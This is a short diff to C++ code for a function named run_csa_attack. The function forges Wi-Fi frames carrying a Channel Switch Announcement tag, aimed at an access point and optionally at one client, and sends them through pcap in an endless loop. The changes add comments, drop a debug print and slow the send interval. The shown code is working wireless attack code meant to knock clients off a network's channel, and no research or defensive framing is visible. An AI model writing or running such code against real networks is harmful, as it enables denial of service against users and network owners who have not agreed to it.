@@ -114,14 +114,15 @@ void run_csa_attack(pcap_t* pcap, std::array<uint8_t, 6> ap_mac, std::array<uint
     if(st_mac != broadcast_byte){
         std::copy(st_mac.begin(), st_mac.end(), attack_packet.begin() + d_address_offset);
     }
+    // csa tag insert
     auto it = attack_packet.begin()+csa_tag_offset;
     u_char* csa_tag_byte = reinterpret_cast<u_char*>(&csa_tag);
     size_t tag_size = sizeof(csa_tag);
     attack_packet.insert(it, csa_tag_byte, csa_tag_byte + tag_size);
+    // attack packet send
     while(true){
-        printf("send\n");
         pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(attack_packet.data()), attack_packet.size());
-        std::this_thread::sleep_for(std::chrono::milliseconds(50));
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
     }
 }
 
